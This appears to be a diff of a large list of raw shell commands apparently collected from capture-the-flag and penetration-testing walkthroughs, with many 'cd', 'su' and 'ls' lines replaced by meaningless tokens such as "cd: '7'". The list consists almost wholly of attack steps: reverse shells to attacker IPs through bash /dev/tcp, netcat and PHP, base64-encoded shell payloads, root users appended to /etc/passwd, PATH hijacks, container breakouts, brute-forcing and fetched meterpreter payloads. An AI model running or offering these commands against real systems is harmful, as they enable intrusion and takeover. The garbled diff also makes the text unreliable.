 cat /etc/hosts
 nc -lvp 8888
 whoami
-su roxi
+su: '2'
 python -c 'import pty; pty.spawn("/bin/sh")'
-ls /var/
-cd /var/mail
+ls: '327'
+cd: '7'
 ls
 cat roxi
-su dorelia
+su: '2'
 sudo -l
-nice --help
+nice
 sudo nice /bin/sh
 whoami
-cd /root/
+cd: '7'
 ls
 nmap -A 10.10.10.138
 python 46635.py -u http://10.10.10.138/writeup/ --crack -w /usr/share/wordlists/rockyou.txt
 ssh jkr@10.10.10.138
-cd /tmp
+cd: '7'
 wget http://192.168.14.15:8000/pspy64
 chmod 777 pspy64
 sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
 sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
+run-parts
 echo "root:raj@123"|chpasswd
 python -m SimpleHTTPServer
-cd /tmp
+cd: '7'
 wget http://10.10.14.15:8000/run-parts
 chmod 777 run-parts
 cp run-parts /usr/local/sbin
 ssh jkr@10.10.10.138
-su root
-cd /root
+su: '2'
+cd: '7'
 cat root.txt
 netdiscover
 nmap -sT -sU -A 192.168.0.110
@@ -12847,14 +12847,14 @@ tftp 192.168.0.110
 cat README.md
 ftp 192.168.0.110
 dir
-cd users
+cd: '7'
 dir
-cd mattermost
+cd: '7'
 dir
 cat message
 ssh mattermost@192.168.0.110
 ls
-cd Desktop/
+cd: '7'
 ls
 cat README.md
 pwd
@@ -12863,7 +12863,7 @@ wget http://192.168.0.110:8080/secret
 ls
 echo $((0xf447))
 whoami
-cd /root/Desktop
+cd: '7'
 cat local.txt
 python -c 'import pty;pty.spawn("/bin/bash")'
 python fuzzing.py > new_fuzz.txt
@@ -12873,15 +12873,15 @@ python -c ‘import pty;pty.spawn(“/bin/bash”)’
 sudo -u pepper /var/www/Admin-Utilities/simpler.py
 sudo -u pepper /var/www/Admin-Utilities/simpler.py -p $(/bin/bash)
 ls
-ls -al
+ls: '321'
 id
-bash -i >& /dev/tcp/10.10.14.9/1234 0>&1
-netcat -lvp 1234
+bash: '5'
+netcat
 cat user.txt
 find / -perm -u=s -type f 2>/dev/null
 wget http://10.10.14.9:8000/raj.service
 nc -lvp 8888
-cd /root
+cd: '7'
 cat root.txt
 nmap -A -p- 10.10.10.114
 ssh clave@10.10.10.114
@@ -12901,53 +12901,53 @@ echo "<html>hello</html>" > index.html
 echo "<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.115/1234 0>&1'");" > shell.php
 zip raj.zip index.html shell.php
 nc -lvp 1234
-su stephen
+su: '2'
 getcap -r /2>/dev/null
 tcpdump -D
 timeout 150 tcpdump -w cap.pcap -i veth1665bcd
 sudo -l
 sudo -u peter service ../../bin/sh
 sudo passwd root
-su root
-cd root
+su: '2'
+cd: '7'
 cat flag.txt
 set rhosts 192.168.0.126
 set lhost 192.168.0.132
 crunch 10 10 aefhrt > dict.txt
 john --wordlist=/root/dict.txt hash
 cat id_rsa.pub > /tmp/authorized_keys
-cd /tmp
+cd: '7'
 chmod 777 authorized_keys
 sudo -u jen /bin/cp authorized_keys /home/jen/.ssh
-cd .ssh
+cd: '7'
 cp id_rsa /tmp
-cd /tmp
+cd: '7'
 chmod 600 id_rsa
 ssh -i id_rsa jen@127.0.0.1
 find / -perm -u=s -type f 2>/dev/null
-cd .game
+cd: '7'
 nmap -A 192.168.0.112
 dirb http://192.168.0.112
 nmap 192.168.0.112 -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local", ldap.password="qMDdyZh3cT6eeAWD"'
 mkdir ignite
-cd ignite
+cd: '7'
 nano shell.sh
 ls
 python -m SimpleHTTPServer
 wget http://192.168.0.114:8000/exploit_1.0_amd64.deb
 sudo -u root /usr/bin/dpkg -i exploit_1.0_amd64.deb
 id
-cd /root
+cd: '7'
 cat proof.txt
 nmap -p- -A 192.168.1.105
 chmod 600 key
 ssh -i key ford@192.168.1.105
 git clone  https://github.com/saghul/lxd-alpine-builder.git
-cd lxd-alpine-builder
+cd: '7'
 python -m SimpleHTTPServer
-cd /tmp
+cd: '7'
 wget http://192.168.1.107:8000/apline-v3.10-x86_64-20191008_1227.tar.gz
-lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
+lxc
 lxc image list
 lxc init myimage ignite -c security.privileged=true
 lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
@@ -12964,30 +12964,30 @@ sqlmap -r raj.txt -D users --dump-all --batch
 nmap -p22 192.168.1.8
 hydra -L user.txt -P pass.txt 192.168.1.8 ssh
 ssh janitor@192.168.1.8
-ls -al
-su fredf
+ls: '317'
+su: '2'
 sudo -l
-cd /opt/devstuff/
-ls -al
+cd: '7'
+ls: '317'
 cat test.py
 openssl passwd -1 -salt pavan 123456
 echo 'pavan:$1$pavan$qv9M3fBmtDPrOTBZflNl81:0:0::/root:/bin/bash' >> /tmp/raj
 sudo test /tmp/raj /etc/passwd
-su pavan
+su: '2'
 nmap -sC -sV -p- 10.10.10.149
 hashcat -m 500 pass.txt /usr/share/wordlists/rockyou.txt --force --outfile output.txt
 python lookupsid.py Hazard:stealth1agent@10.10.10.149
 evil-winrm -i 10.10.10.149 -u chase -p 'Q4)sJu\Y8qz*A3?d' -s './ps1_scripts/' -e './exe_files/'
 whoami
-cd ..
-cd Desktop
+cd: '7'
+cd: '7'
 cat user.txt
-cd appdata\Roaming\Mozilla\firefox
+cd: '7'
 ps
 evil-winrm -i 10.10.10.149 -u administrator -p '4dD!5}x/re8]FBuZ' -s './ps1_scripts/' -e './exe_files/'
 whoami
-cd ..
-cd Desktop
+cd: '7'
+cd: '7'
 cat root.txt
 nmap -A 192.168.1.167
 hydra -l root -P /usr/share/wordlists/rockyou.txt  192.168.1.167 mysql
@@ -13001,23 +13001,23 @@ cat 14925.txt
 dirb http://192.168.1.197:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..home%2fweborf%2f
 ssh weborf@192.168.1.197
 mysql -u weborf -p
-su sunrise
+su: '2'
 sudo -l
-cd /tmp
-msfpc windows 192.168.1.107
+cd: '7'
+msfpc
 wget http://192.168.1.107:8080/windows-meterpreter-staged-reverse-tcp-443.exe
 sudo wine windows-meterpreter-staged-reverse-tcp-443.exe
-cd /root
+cd: '7'
 ls
 cat root.txt
 netdiscover
 nmap -A 192.168.1.165
 dirb http://192.168.1.165/
-cd Downloads
+cd: '7'
 cat management.log
 enum4linux -a 192.168.1.165
 smbclient //192.168.1.165/ITDEPT
-ls -al
+ls: '316'
 echo "nc -e /bin/bash -lvp 1234 &" > product-control
 echo "nc -e /bin/bash -lvp 1235 &" > web-control
 ls
@@ -13027,7 +13027,7 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 find / -perm -u=s -type f 2>/dev/null
 whoami
 whoami
-cd /root
+cd: '7'
 ls
 cat flag.txt
 netdiscover
@@ -13048,14 +13048,14 @@ ssh sunset@192.168.1.153
 ls
 sudo –l
 sudo /usr/bin/ed
-cd /root
+cd: '7'
 ls
 cat flag.txt
 nmap -p- -A 192.168.29.148
 ssh alice@192.168.29.148
 sudo /usr/bin/php -r '$sock=fsockopen("192.168.29.157",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 nc -lvp 1234
-cd /root
+cd: '7'
 ls
 cat flag2.txt
 netdiscover
@@ -13073,41 +13073,41 @@ set rport 65535
 set targeturi /phpcms
 set username notadmin
 set password Pa$$w0rd13!&
-cd /home
+cd: '7'
 ls
-cd doe
+cd: '7'
 ls
 find / -perm -u=s -type f 2>/dev/null
-cd /home/doe
+cd: '7'
 ls
 cat local.txt
 cat noteFromAdmin
 export PWD=\$\(/bin/bash\)
 ssh-keygen
-cd .ssh
+cd: '7'
 ls
 cat id_rsa.pub > authorized_keys
 python -SimpleHTTPServer
 mkdir /home/john/.ssh
-cd /home/john/.ssh && wget http://192.168.1.107:8000 /authorized_keys
+cd: '7'
 ssh john@192.168.1.103
-ls -la
+ls: '304'
 cat user.txt
-cd .local
-ls -la
-cd share
-ls -la
+cd: '7'
+ls: '304'
+cd: '7'
+ls: '304'
 cat myPassword
 echo "am9objpZWlckczhZNDlJQiNaWko=" | base64 -d
 sudo -l
-cd /var/www/html
+cd: '7'
 ls
 echo "/bin/bash" > test.html
 echo "/bin/bash" > /var/www/html/test.html
 chmod 777 /var/www/html/test.html
 sudo /var/www/html/test.html
 ls
-cd /root
+cd: '7'
 ls
 cat root.txt
 netdiscover
@@ -13132,11 +13132,11 @@ cat dict.txt
 hydra -L user.txt -P dict.txt 192.168.1.101 ssh -s 65345 -e nsr
 ssh pinak@192.168.101 -p 65345
 sudo -l
-cd /home/sarang
-ls -la
-cd .ssh
+cd: '7'
+ls: '300'
+cd: '7'
 ssh-keygen
-cd .ssh
+cd: '7'
 ls
 chmod 777 id_rsa.pub
 cp id_rsa.pub /home/pinak
@@ -13146,7 +13146,7 @@ sudo -l
 touch raj
 pwd
 sudo zip /tmp/raj.zip /home/sarang/raj -T --unzip-command="sh -c /bin/bash"
-cd /root
+cd: '7'
 ls
 cat flag.txt
 netdiscover
@@ -13155,19 +13155,19 @@ dirb http://192.168.1.101/ -X .txt
 wget http://192.168.1.101/abuse.txt
 cat abuse.txt
 wget http://192.168.1.101/ashoka.pcapng
-wireshark ashoka.pcapng
+wireshark
 ftp 192.168.1.101
-ls -la
+ls: '298'
 mkdir .ssh
-cd .ssh
+cd: '7'
 ssh-keygen
-cd .ssh
+cd: '7'
 ls
 cat id_rsa.pub > authorized_keys
 ls
 ls
 ssh ashoka@192.168.1.101
-ls /tmp
+ls: '295'
 cat /tmp/logs
 set lhost 192.168.1.107
 set session 1
@@ -13189,21 +13189,21 @@ nc -nlvp 1234
 nc -e /bin/sh 192.168.43.249 1234
 nc -e /bin/sh 192.168.43.249 1234
 echo bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjQzLjI0OSAxMjM0 | base64 -d | bash
-bash -i >& /dev/tcp/192.168.43.249/8080 0>&1
+bash: '4'
 echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQzLjI0OS84MDgwIDA+JjE=
 nc -nlvp 8080
 whoami
 ls
 cat app.py
-cd /home
-cd nitish/.dev/
+cd: '7'
+cd: '7'
 cat creds.txt
 bash
 python -c 'import pty;pty.spawn("/bin/sh")'
-su nitish
+su: '2'
 whoami
 ls
-cd nitish
+cd: '7'
 ls
 cat user.txt
 sudo -l
@@ -13216,7 +13216,7 @@ sudo -l
 sudo -u root /root/lago
 whoami
 bash
-su root
+su: '2'
 cd
 ls
 arp-scan --localnet --ignoredups
@@ -13224,7 +13224,7 @@ tcpdump -A -n host 192.168.138.100 and arp
 tcpdump -A -n host 192.168.138.100 and not arp
 nc -u 192.168.138.100 666
 python -c "print 'j19s4w'" | nc -u 192.168.138.100 666 -q1 | base64 -d
-for knock in 5500 6600 7700; do nmap -Pn --host-timeout 201 --max-retries 0 -p $knock 192.168.138.100; done
+for
 nmap -A -T4 -p- 192.168.138.100
 wget -c http://192.168.138.100/jigsaw.gif
 file jigsaw.gif
@@ -13236,12 +13236,12 @@ find / -perm -u=s -type f 2>/dev/null
 file /bin/game3
 scp jigsaw@192.168.138.100:/bin/game3  /destination_path
 import struct
-print buf
-ldd /bin/game3 | grep libc
-readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
+print
+ldd
+readelf
 readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
 strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
-from subprocess
+from
 import call import struct
 python xpl.py
 netdiscover
@@ -13253,13 +13253,13 @@ set rhosts 192.168.1.103
 set targeturi /wordpress
 set username c0rrupt3d_brain
 set password 24992499
-cd /home
+cd: '6'
 ls
-cd root3r
+cd: '6'
 ls
 cat .root_password_ssh.txt
 python -c 'import pty;pty.spawn("/bin/bash")'
-su root
+su: '2'
 netdiscover
 nmap -A -p- 192.168.1.221
 ftp 192.168.1.221
@@ -13279,8 +13279,8 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 id
 pwd
 docker run -it -v /root:/mnt/ignite ubuntu
-cd /mnt
-cd ignite
+cd: '6'
+cd: '6'
 ls
 cat proof.txt
 netdiscover
@@ -13292,25 +13292,25 @@ crunch 4 4 -t @%%, -o wordlist
 hydra -L /usr/share/wordlists/rockyou.txt -p 3_d4y -T4 192.168.1.184 ssh
 ssh marcus@192.168.1.184
 id
-cd /etc
+cd: '6'
 ssh marcus@192.168.1.184 -t "bash --noprofile"
-cd /etc
+cd: '6'
 pwd
 cat passwd
 find /bin -type f -perm -u=s 2>/dev/null
 openssl passwd -1 -salt raj pass123
 nano passwd
 cat passwd | tail
-su raj
+su: '2'
 whoami
-cd /root
-ls -al
+cd: '6'
+ls: '284'
 cat flag.txt
 netdiscover
 nmap -p- -A 192.168.1.105
 ftp 192.168.1.105 65530
 ls
-cd pub
+cd: '6'
 ls
 python 7z2ctf.py arjun.7z > hash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
@@ -13323,23 +13323,23 @@ nc -lvp 1234
 python -c 'import pty;pty.spawn("/bin/bash")'
 id
 docker run -v /root:/mnt -it alpine
-cd /mnt
+cd: '6'
 ls
 cat final.txt
 nmap -A 192.168.1.101
-cd /tmp
+cd: '6'
 mkdir ignite
 mount -t nfs 192.168.1.101:/home/shivay /tmp/ignite
-cd ignite
+cd: '6'
 ls
 python cloackifyFactory.py
 sudo -u#-1 watch -x sh -c 'reset; exec sh 1>&0 2>&0' -u
-cd root
+cd: '6'
 cat final.txt
 netdiscover
 nmap -A 192.168.1.101
 git clone https://github.com/Hackingzone/hackingarticles.git
-cd hackingarticles/
+cd: '6'
 ls
 git log
 git log 4fb65717a4bdfa8169fb0642abf0f355f7eea048
@@ -13347,7 +13347,7 @@ git show 4fb65717a4bdfa8169fb0642abf0f355f7eea048
 echo "Q2FwdGFpbiBBbWVyaWNhJ3MgU2hpZWxkOnswNjE3ODZEOUE4QkI4OUEyRkU3NDVERDI2RkUyRTEzQ30=" | base64 -d
 dirb http://192.168.1.101
 locate zip2john
-cd Downloads/
+cd: '6'
 john --wordlist=/root/cupp/tony.txt hash
 unzip hammer.zip
 john --wordlist=/root/cupp/tony.txt hashes
@@ -13357,14 +13357,14 @@ id
 nc -lvp 4444
 python -c 'import pty;pty.spawn("/bin/bash")'
 find / -perm -u=s -type f 2>/dev/null
-cd /tmp
+cd: '6'
 echo "/bin/bash" > ifconfig
 chmod 777 ifconfig
 export PATH=/tmp:$PATH
-cd /root
+cd: '6'
 ls
 cat final.txt
-cd /opt
+cd: '6'
 ls
 cat yakahints.txt
 cp yaka.xlsx /var/www/html/
@@ -13373,10 +13373,10 @@ nmap -A 192.168.0.4
 smbclient -L \\192.168.0.4
 smbclient //192.168.0.4/Naruto
 netstat -antp
-su yashika
+su: '2'
 getcap -r / 2>/dev/null
 id
-cd /root
+cd: '6'
 ls
 cat final.txt
 nmap -A 192.168.1.101
@@ -13386,7 +13386,7 @@ cat secret.txt
 head -n 100 rockyou.txt > dict.txt
 id
 git clone https://github.com/saghul/lxd-alpine-builder.git
-cd lxd-alpine-builder
+cd: '6'
 ls
 python -m SimpleHTTPServer
 wget http://192.168.1.107:8000/alpine-v3.10-x86_64-20191019_0712.tar.gz
@@ -13397,7 +13397,7 @@ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=tru
 lxc start ignite
 lxc exec ignite /bin/sh
 id
-cd /mnt/root/root
+cd: '6'
 ls
 cat final.txt
 netdiscover
@@ -13414,12 +13414,12 @@ python -m SimpleHTTPServer
 nc -lvp 1234
 netstat -antp
 mysql -u root
-ls -la /etc/passwd
+ls: '274'
 openssl passwd -1 -salt user3 pass123
 echo 'raj:$1$user3$rAGRVf5p2jYTqtq0W5cPu/:0:0::/root:/bin/bash' >>/etc/passwd
 tail /etc/passwd
-su raj
-cd /root
+su: '2'
+cd: '6'
 ls
 cat final.txt
 netdiscover
@@ -13433,7 +13433,7 @@ set username admin
 set password avengers
 set targeturi /
 find / -perm -u=s -type f 2>/dev/null
-cd /opt
+cd: '6'
 ls
 python keepass.py morag.kdbx > hash
 john hash
@@ -13445,22 +13445,22 @@ cat final.txt
 nmap -A 192.168.0.27
 dirb http://192.168.0.27/
 wpscan --url http://192.168.0.27/wordpress --enumerate p
-cd /home
+cd: '6'
 ls
-cd raj
+cd: '6'
 ls
 cat flag1.txt
 find / -perm -u=s -type f 2>/dev/null
 openssl passwd -1 -salt ignite pass123
-cd /home/raj
+cd: '6'
 cat /etc/passwd
 cat /etc/passwd
-cd /home/raj
-cd /etc
+cd: '6'
+cd: '6'
 wget -O passwd http://192.168.0.16:8000/passwd
 tail /etc/passwd
-su ignite
-cd /root
+su: '2'
+cd: '6'
 ls
 cat proof.txt
 curl http://192.168.0.27/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpasswd
@@ -13485,10 +13485,10 @@ nmap -A 192.168.0.20
 wpscan --url http://192.168.0.20/
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 python -c 'import pty;pty.spawn("/bin/bash")'
-su webmaster
+su: '2'
 sudo -l
 sudo su
-cd /root
+cd: '6'
 ls
 cat flag.txt
 netdiscover
@@ -13501,7 +13501,7 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 find / -perm -u=s -type f 2>/dev/null
 find . -exec /bin/sh -p \; -quit
 id
-cd /root
+cd: '6'
 ls
 cat root.txt
 netdiscover
@@ -13511,8 +13511,8 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 openssl passwd -1 -salt user3 pass123
 echo 'raj:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0::/root:/bin/bash' >>/etc/passwd
 tail /etc/passwd
-su raj
-cd /root
+su: '2'
+cd: '6'
 ls
 cat root.txt
 nmap -A 10.10.10.134
@@ -13524,13 +13524,13 @@ mkdir /mnt/L4mpje-PC
 mkdir /mnt/vhd
 mount -t cifs //10.10.10.134/Backups/WindowsImageBackup/L4mpje-PC /mnt/L4mpje-PC/ -o user=anonymous
 mount -r /dev/nbdOpl /mnt/vhd
-cd /mnt/vhd
-ls -la
-cd Windows/System32/config
-ls -la
+cd: '6'
+ls: '265'
+cd: '6'
+ls: '265'
 ssh l4mpje@10.10.10.134
 git clone https://github.com/haseebT/mRemoteNG-Decrypt.git
-cd mRemoteNG-Decrypt/
+cd: '6'
 ssh administrator@10.10.10.134
 nmap -A 10.10.10.137
 ftp 10.10.10.137
@@ -13548,7 +13548,7 @@ echo '/bin/sh' > whoami
 chmod 777 whoami
 export PATH=/tmp:$PATH
 id
-cd /root
+cd: '6'
 nmap -A 192.168.1.101
 dirb http://192.168.1.101
 dirb http://192.168.1.101/ -X .txt
@@ -13558,12 +13558,12 @@ dirb http://192.168.0.3/
 john --wordlist=dict .txt hash.txt
 nc -lvp 1234
 pwd
-cd var/www/html
+cd: '6'
 ls
-cd webadmin
+cd: '6'
 ls
-cd S0mextras
-ls -al
+cd: '6'
+ls: '263'
 cat .sshUserCred55512.txt
 ssh n0nr00tuser@192.168.0.3
 id
@@ -13576,7 +13576,7 @@ wget http://192.168.0.26:8000/alpine-v3.10-x86_64-20190905_0123.tar.gz
 nano raj.sh
 chmod 777 raj.sh
 id
-cd /mnt/root/root
+cd: '6'
 ls
 cat flag.txt
 netdiscover
@@ -13603,7 +13603,7 @@ ls
 cat flag.txt
 sudo -l
 sudo vim
-cd /root
+cd: '6'
 ls
 cat fl4g.txt
 nmap -A 192.168.1.105
@@ -13612,17 +13612,17 @@ wget http://192.168.1.105/admin/aspadmin/user.list
 wget http://192.168.1.105/admin/aspadmin/password.list
 searchsploit showtime2
 find / -perm -u=s -type f 2>/dev/null
-cd /tmp
+cd: '6'
 echo "/bin/bash" > ifconfig
 chmod 777 ifconfig
 export PATH=/tmp:$PATH
 whoami
-cd /tmp
+cd: '6'
 wget http://192.168.1.106/LinEnum.sh
 chmod 777 LinEnum.sh
 openssl passwd -1 -salt user3 pass123
 echo 'raj:$1$user3$rAGRVf5p2jYTqt0W5cPu/:0:0::/root:/bin/bash' >> /etc/passwd
-su raj
+su: '2'
 netdiscover
 nmap -A 192.168.0.8
 dirb http://192.168.0.8/
@@ -13653,21 +13653,21 @@ sh shell.sh https://192.168.1.105:13337
 nc -lvp 1337
 cd
 ls
-cd from_zenitsu
+cd: '5'
 ls
 cat nezuko.txt
 cat /etc/passwd
 john hash --show
-su zenitsu
+su: '2'
 cd
 ls
-cd to_nezuko
-ls –la send_message_to_nezuko.sh
+cd: '4'
+ls: '257'
 msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.106 lport=1234 R
 echo "0<&60-;exec 60<>/dev/tcp/192.168.1.106/1234;sh <&60 >&60 2>&60" >> send_message_to_nezuko.sh
 nc -lvp 1234
 id
-cd /root
+cd: '4'
 ls
 cat root.txt
 netdiscover
@@ -13681,10 +13681,10 @@ wpscan --url http://10.10.10.10/wordpress -e p
 searchsploit site editor 1.1.1
 searchsploit –m 44340
 curl http://10.10.10.10/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
-cd /tmp
+cd: '4'
 mkdir raj
 mount –t nfs 10.10.10.10:/home/dpwwn02 raj
-cd /raj
+cd: '4'
 ls
 cp /root/shell.php
 ls
@@ -13692,25 +13692,25 @@ nc –lvp 1234
 find /-perm –u=s –type f 2>/dev/null
 which wget
 find /home –exec chmod u+s /usr/bin/wget \;
-ls –la /usr/bin/wget
+ls: '254'
 cat /etc/passwd
 openssl passwd -1 –salt user3 pass123
 nano passwd
 wget –O passwd http://10.10.10.128:8080/passwd
-su raj
-cd /root
+su: '2'
+cd: '4'
 ls
 cat dpwwn-02-FLAG.txt
 netdiscover
 mysql –h 192.168.1.101 –u root –p
 ssh mistic@192.168.1.101
-ls –la
+ls: '253'
 cat logrot.sh
 cat /etc/crontab
 msfvenom –p cmd/unix/reverse_bash lhost=192.168.1.106 lport=1234 R
 echo ‘0<&74-;exec 74<>/dev/tcp/192.168.1.106/1234;sh <&74 >&74 2>&74’ > logrot.sh
 nc –lvp 1234
-cd /root
+cd: '4'
 ls
 cat dpwwn-01—FLAG.txt
 dirb http://192.168.1.107 -X .php
@@ -13718,46 +13718,46 @@ sqlmap -r sql --dbs --batch --risk 3 --level 5
 sqlmap -r sql -D library --dump-all --batch --risk 3 --level 5
 ftp 192.168.1.107
 ls
-cd html
+cd: '4'
 ls
 ls
 chmod 777 shell.PHP
 nc –lvp 1234
 python -c 'import pty; pty.spawn("/bin/sh")'
-cd /var/mail
+cd: '4'
 ls
 cat welcome
-su root
+su: '2'
 id
 dirb http://192.168.1.103 -X .php
 sqlmap -r file.txt --dbs –batch --risk 3 --level 5
 sqlmap -r file.txt -D library --dump-all --batch
 ftp 192.168.1.103
-cd /var/www/html
+cd: '4'
 ls
 chmod 777 shell.php
 nc -lvp 1234
 python -c 'import pty;pty.spawn("/bin/bash")'
-cd /var/www/html
+cd: '4'
 cat library.php
-su root
+su: '2'
 id
 netdiscover
 nmap -A 192.168.1.104
 chmod 777 LinEnum.sh
 find / -type f -perm 0777 2>dev/null
 aircrack-ng -w gold_star.txt wytshadow.cap
-su wytshadow
+su: '2'
 cd
-ls -al
+ls: '247'
 sudo -l
 sudo /usr/sbin/service nginx start
 netstat -antp
 apt install lynx
-lynx http://192.168.1.104:8080
-su genphulx
+lynx
+su: '2'
 cd
-ls -al
+ls: '247'
 file maleus
 cat maleus
 chmod 600 key
@@ -13769,7 +13769,7 @@ nano dont_even_bother.c
 gcc dont_even_bother.c -o dont_even_bother
 sudo /home/maleus/dont_even_bother
 id
-cd /root
+cd: '2'
 ls
 cat flag.txt
 netdiscover
@@ -13780,10 +13780,10 @@ nc -lvp 1234
 ssh mkelepc@192.168.1.101
 netdiscover
 ftp 192.168.1.105
-ls -la
-cd .ngircd
+ls: '246'
+cd: '2'
 ls
-cd .ssh
+cd: '2'
 cat channels
 cat id_rsa
 set rhosts 192.168.1.105
@@ -13791,16 +13791,16 @@ set user_file /root/users
 chmod 600 id_rsa
 ssh -i id_rsa patrick@192.168.1.105
 sudo -l
-cd /tmp
+cd: '2'
 wget http://192.168.1.106:8000/LinEnum.sh
 chmod 777 LinEnum.sh
-ls -la /etc/apache2/apache2.conf
+ls: '245'
 nano /etc/apache2/apache2.conf
-cd /usr/share/webshells/php
-ls -la
+cd: '2'
+ls: '245'
 cp php-reverse-shell.php /root/shell.php
 nano shell.php
-cd /var/www/html
+cd: '2'
 wget http://192.168.1.106:8000/shell.php
 sudo /bin/systemctl reboot
 nc -lvp 1234
@@ -13830,15 +13830,15 @@ dirb http://192.168.1.103
 set rhost 192.168.1.103
 set lhost 192.168.1.105
 set targeturi /cgi-bin/underworld/
-cd /tmp
+cd: '2'
 tcpdump -D
 tcpdump -w file.pcap -i lo
 ls
-cd /tmp
+cd: '2'
 python -c 'import pty;pty.spawn("/bin/bash")'
 chmod 777 pspy32
 find /-writable -type d 2>/dev/null
-cd /opt/ftpclient
+cd: '2'
 ls
 cat ftpclient.py
 rm ftpclient.py
@@ -13847,13 +13847,13 @@ import os
 wget http://192.168.1.105:8000/ftpclient.py
 nc -lvp 1234
 id
-cd /root
+cd: '2'
 cat proof.txt
 nmap –A 192.168.1.102
 smbclient –L 192.168.1.102
 smbclient //192.168.1.102/anonymous
 ls
-cd backups
+cd: '2'
 hydra –l aeolus –P /usr/share/wordlists/rockyou.txt 192.168.1.102 ssh
 set rhosts 192.168.1.102
 set username aeolus
@@ -13867,7 +13867,7 @@ set password sergiotaemo
 sudo –l
 sudo mysql -e '\! /bin/sh'
 id
-cd /root
+cd: '2'
 cat proof.txt
 nmap -A 192.168.0.16
 enum4linux 192.168.0.16
@@ -13875,13 +13875,13 @@ wpscan --url http://symfonos.local/h3l105/ --enumerate p
 telnet 192.168.0.16 25
 nc -lvp 1234
 find / -perm -u=s -type f 2>/dev/null
-cd /tmp
+cd: '2'
 echo "/bin/sh" > curl
 chmod 777 curl
 echo $PATH
 export PATH=/tmp:$PATH
 id
-cd /root
+cd: '2'
 cat proof.txt
 netdiscover
 nmap -A 192.168.1.108
@@ -13890,7 +13890,7 @@ sqlmap -r sql.txt -D webapphacking --dump-all --batch
 dirb http://192.168.1.108
 nc -lvp1234
 find / -perm -u=s -type f 2>/dev/null
-cd /home/legacy
+cd: '2'
 id
 netdiscover
 nmap –A 192.168.1.104
@@ -13903,7 +13903,7 @@ set targeturi /wordpress
 set rport 1337
 set ReverseAllowProxy true
 set lhost 192.168.1.105
-cd jerome
+cd: '2'
 cat flag.txt
 cat /etc/crontab
 cat /usr/share/simulate.sh
@@ -13917,17 +13917,17 @@ dirb http://192.168.1.35
 nc -lvp 1234
 whoami
 getcap -r / 2>/dev/null
-cd /tmp
+cd: '2'
 tar -cvf readme.tar /home/domom/Desktop/README.md
 tar -xvf readme.tar
 cat tar /home/domom/Desktop/README.md
-su root
+su: '2'
 nmap -A 192.168.131.170
 ssh gogu@192.168.131.170
 id
 cat user.txt
-ls -la
-ls -lRah
+ls: '240'
+ls: '240'
 echo "/bin/sh/" > date
 chmod 777 date
 export PATH=/home/gogu:$PATH
@@ -13940,8 +13940,8 @@ chmod 777 bypass
 echo "/home/gogu/bypass">date
 chmod 777 date
 export PATH=/home/gogu:$PATH
-id 1<&2
-cd root
+id: '47'
+cd: '2'
 cat root.txt
 netdiscover
 dirb http://192.168.1.101/3306 -X .html
@@ -13949,52 +13949,52 @@ ssh employee@192.168.1.101
 find / -perm -u=s -type f 2>/dev/null
 cat /etc/passwd | /usr/bin/micro
 openssl passwd -1 -salt user3 pass123
-su test
+su: '2'
 id
-cd /root
+cd: '2'
 cat flag.txt
 nmap –A 192.168.1.108
 dirb http://192.168.1.108/ -X .php
 git clone https://github.com/brendan-rius/c-jwt-cracker.git
-cd c-jwt-cracker/
+cd: '2'
 apt-get install libssl-dev
 make
 msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.1.106 lport=4444 -f elf > /root/Desktop/shell
 php –S 0.0.0.0:80
 nc –lvp 4444
 bash -i
-su root
+su: '2'
 ls
 cat flag.txt
 nmap -A 192.168.1.104
 ftp 192.168.1.104
 ls
-cd download
+cd: '2'
 ls
 telnet 192.168.1.104 21
 echo "awk 'BEGIN {system(\"/bin/bash\")}'" > test
 telnet 192.168.1.104 21
 sudo /home/patrick/script/test
-cd /root
+cd: '2'
 cat proof.txt
 nmap -p- -A 192.168.1.102
 ssh whitepointer@192.168.1.102 -p 65022
 find / -perm -u=s -type  f 2>/dev/null
-cd /tmp
+cd: '2'
 echo "/bin/bash" > whoami
 chmod 777 whoami
 export PATH=/tmp:$PATH
-cd /root
+cd: '2'
 cat flag.txt
 nmap -sC -sV 10.10.10.123
 smbmap -H 10.10.10.123
 smbmap //10.10.10.123/general
 ls
-host -l friendzone.red 10.10.10.123
+host
 smbclient //10.10.10.123/Development
 ssh friend@10.10.10.123
 cat /opt/server_admin/reporter.py
-cd /tmp
+cd: '2'
 echo "system ('cat /root/root.txt > /tmp/flag')" >> /usr/lib/python2.7/os.py
 nmap –p- –A 192.168.1.104
 dirb http://192.168.1.104
@@ -14006,10 +14006,10 @@ id
 ssh guest@192.168.1.104 –p6464 –t "bash --noprofile"
 sudo -l
 ssh-keygen
-cd .ssh
+cd: '2'
 chmod 777 id_rsa.pub
 cp id_rsa.pub /home/guest
-cd ..
+cd: '2'
 sudo -u trinity /bin/cp ./id_rsa.pub /home/trinity/.ssh/authorized_keys
